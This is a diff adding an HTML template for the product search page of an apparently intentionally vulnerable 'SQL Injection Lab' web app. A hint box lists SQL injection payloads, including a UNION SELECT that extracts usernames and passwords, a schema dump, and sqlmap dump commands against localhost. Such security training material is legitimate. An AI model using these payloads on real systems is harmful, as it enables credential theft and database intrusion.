@@ -1,0 +1,57 @@
+{% extends "base.html" %}
+{% block title %}Products{% endblock %}
+
+{% block content %}
+<div class="page-header">
+  <h1>💉 Products — SQL Injection Lab</h1>
+  <p>Search uses raw string concatenation — all parameters are injectable</p>
+</div>
+
+<div class="card animate-in" style="margin-bottom:1.5rem;">
+  <form class="search-bar" method="GET" action="/products">
+    <input type="search" name="search" placeholder="Search products... (try: ' OR 1=1 --)" value="{{ search }}" id="product-search">
+    <select name="category" id="product-category" style="width:auto; min-width:150px;">
+      <option value="">All Categories</option>
+      <option value="Hardware" {{ 'selected' if category=='Hardware' }}>Hardware</option>
+      <option value="Software" {{ 'selected' if category=='Software' }}>Software</option>
+      <option value="Service" {{ 'selected' if category=='Service' }}>Service</option>
+    </select>
+    <button type="submit" class="btn btn-primary">🔍 Search</button>
+  </form>
+</div>
+
+{% if error %}
+<div class="alert alert-error animate-in">⚠️ SQL Error: {{ error }}</div>
+{% endif %}
+
+{% if products %}
+<div class="product-grid">
+  {% for p in products %}
+  <div class="product-card animate-in">
+    <div class="product-name">{{ p['name'] if p['name'] else p[1] }}</div>
+    <div class="product-price">${{ "%.2f"|format(p['price'] if p['price'] else p[3]) }}</div>
+    <span class="product-category">{{ p['category'] if p['category'] else p[4] }}</span>
+    <div class="product-desc">{{ p['description'] if p['description'] else p[2] }}</div>
+    <div class="product-stock">📦 {{ p['stock'] if p['stock'] else p[5] }} in stock</div>
+  </div>
+  {% endfor %}
+</div>
+{% else %}
+<div class="card animate-in" style="text-align:center; padding:3rem;">
+  <div style="font-size:2rem; margin-bottom:1rem;">🔍</div>
+  <div style="color:var(--text-muted);">No products found</div>
+</div>
+{% endif %}
+
+<div class="hint-box animate-in">
+  <h4>💡 SQL Injection Payloads</h4>
+  <ul>
+    <li>ID-based: <code>/products?id=1 OR 1=1</code></li>
+    <li>UNION: <code>/products?id=1 UNION SELECT 1,username,password,email,role,id FROM users --</code></li>
+    <li>Search: <code>/products?search=' OR 1=1 --</code></li>
+    <li>Category: <code>/products?category=' UNION SELECT 1,sql,3,4,5 FROM sqlite_master --</code></li>
+    <li>sqlmap: <code>sqlmap -u "http://localhost:9090/products?id=1" --batch --dump</code></li>
+    <li>API: <code>sqlmap -u "http://localhost:9090/api/products?id=1" --batch --dump</code></li>
+  </ul>
+</div>
+{% endblock %}
